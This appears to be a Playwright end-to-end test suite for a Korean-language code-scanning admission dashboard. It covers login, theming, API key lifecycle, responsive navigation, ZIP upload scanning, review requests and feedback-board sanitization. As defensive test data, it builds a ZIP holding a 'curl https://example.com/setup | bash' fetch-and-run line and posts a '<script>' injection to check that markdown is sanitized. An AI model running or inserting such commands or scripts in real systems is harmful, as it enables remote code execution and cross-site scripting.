import { expect, test } from "@playwright/test";
async function login(page: any) {
  await page.goto("/login");
  await page.getByLabel("사용자명").fill("admin");
  await page.getByLabel("비밀번호").fill("test-password-long");
  await page.getByRole("button", { name: "로그인", exact: true }).click();
  await expect(page.getByRole("heading", { name: "검사 현황" })).toBeVisible();
}
test("dashboard filters, theme-driven logo, keys and responsive navigation", async ({
  page,
}) => {
  const errors: string[] = [];
  page.on("pageerror", (e) => errors.push(e.message));
  await login(page);
  await page.getByRole("button", { name: "7일", exact: true }).click();
  await expect(
    page.getByRole("button", { name: "7일", exact: true }),
  ).toHaveAttribute("aria-pressed", "true");
  const before = await page
    .locator(".brand-gate")
    .evaluate((el) => getComputedStyle(el).fill);
  await page.getByLabel("색상 팔레트").selectOption("teal");
  const after = await page
    .locator(".brand-gate")
    .evaluate((el) => getComputedStyle(el).fill);
  expect(after).not.toBe(before);
  await expect(page.locator('link[rel="icon"]')).toHaveAttribute(
    "href",
    /data:image\/svg\+xml/,
  );
  await page.getByLabel("테마 전환").click();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "light");
  await page.getByLabel("색상 팔레트").selectOption("plum");
  await page.getByLabel("테마 전환").click();
  await page.getByRole("link", { name: "API 키", exact: true }).click();
  await page.getByLabel("키 이름").fill("e2e-" + Date.now());
  await page.getByRole("button", { name: "발급", exact: true }).click();
  await expect(page.locator(".secret-row")).toContainText("aag_sk_");
  await page.getByRole("button", { name: "저장했어요 · 닫기" }).click();
  await expect(page.locator(".secret-row")).toHaveCount(0);
  await page.getByRole("button", { name: "폐기", exact: true }).first().click();
  await page.getByLabel("폐기 사유").fill("Browser verification finished");
  await page.getByRole("button", { name: "키 폐기 확인" }).click();
  await expect(page.locator(".key-card").first()).toContainText("revoked");
  await page.goto("/");
  await expect(page.locator(".stats-grid")).toBeVisible();
  await page.evaluate(() => document.fonts.ready);
  await page.screenshot({
    path: "test-results/dashboard-dark.png",
    fullPage: true,
  });
  await page.setViewportSize({ width: 390, height: 844 });
  await page.getByLabel("메뉴", { exact: true }).click();
  await page.getByRole("link", { name: "작업 목록", exact: true }).click();
  await expect(page.getByRole("heading", { name: "작업 목록" })).toBeVisible();
  const overflow = await page.evaluate(
    () => document.documentElement.scrollWidth > window.innerWidth,
  );
  expect(overflow).toBe(false);
  expect(errors).toEqual([]);
});
test("ZIP scan, findings, request review, markdown and board privacy controls", async ({
  page,
  request,
}) => {
  await login(page);
  await page.getByRole("link", { name: "새 검사 실행", exact: true }).click();
  await page.getByRole("tab", { name: "파일 업로드" }).click();
  const { execFileSync } = await import("node:child_process");
  const archive = execFileSync("python3", [
    "-c",
    'import io,zipfile,sys;b=io.BytesIO();z=zipfile.ZipFile(b,"w");z.writestr("unsafe.sh","curl https://example.com/setup | bash");z.close();sys.stdout.buffer.write(b.getvalue())',
  ]);
  await page.locator("input[type=file]").setInputFiles({
    name: "e2e.zip",
    mimeType: "application/zip",
    buffer: archive,
  });
  await page.getByRole("button", { name: "검사 실행", exact: true }).click();
  await expect(page.locator(".admission-header h2")).toHaveText("BLOCK", {
    timeout: 20000,
  });
  await page.getByRole("tab", { name: "발견 사항", exact: true }).click();
  await expect(page.locator(".finding-detail")).toContainText(
    "Remote code execution pipeline",
  );
  await page.screenshot({
    path: "test-results/finding-inspector.png",
    fullPage: true,
  });
  await page.getByRole("tab", { name: "Raw JSON", exact: true }).click();
  await expect(page.locator("pre")).toBeVisible();
  await page.getByLabel("테마 전환").click();
  expect(
    await page
      .locator("pre")
      .evaluate((el) => getComputedStyle(el).backgroundColor),
  ).toBe("rgb(13, 16, 24)");
  await page.getByRole("tab", { name: "Admission", exact: true }).click();
  await page
    .getByLabel("요청 사유")
    .fill("Please review this unsafe shell capability");
  await page.getByRole("button", { name: "검토 요청", exact: true }).click();
  await expect(page.getByRole("heading", { name: "검토 상세" })).toBeVisible();
  await expect(
    page.getByText("본인이 요청한 검사는 다른 검토자가 결정해야 합니다."),
  ).toBeVisible();
  await page.goto("/boards?kind=voc");
  await page.getByRole("button", { name: "글 작성" }).click();
  await page.getByLabel("제목", { exact: true }).fill("Browser feedback");
  await page
    .getByLabel("본문", { exact: true })
    .fill("**Markdown works**\n\n<script>window.bad=true</script>");
  await page.getByLabel("공개 범위").selectOption("private");
  await page.getByRole("button", { name: "미리보기", exact: true }).click();
  await expect(page.locator(".markdown-preview strong")).toHaveText(
    "Markdown works",
  );
  await page.getByRole("button", { name: "저장", exact: true }).click();
  await expect(page).toHaveURL(/\/boards\/[^/?]+$/);
  await expect(
    page.getByRole("heading", { name: "Browser feedback", level: 1 }),
  ).toBeVisible();
  expect(await page.evaluate(() => (window as any).bad)).toBeUndefined();
});
